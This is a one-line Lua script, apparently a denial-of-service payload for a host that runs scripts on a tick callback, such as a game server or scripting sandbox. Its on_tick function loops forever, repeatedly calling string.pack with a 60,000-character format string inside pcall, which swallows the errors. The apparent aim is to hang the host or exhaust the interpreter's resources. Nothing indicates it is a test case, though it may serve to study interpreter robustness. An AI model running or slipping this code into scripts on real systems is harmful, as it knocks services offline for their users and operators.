local sp = string.pack local f = string.rep("b", 60000) function on_tick() while true do pcall(sp, f) end end
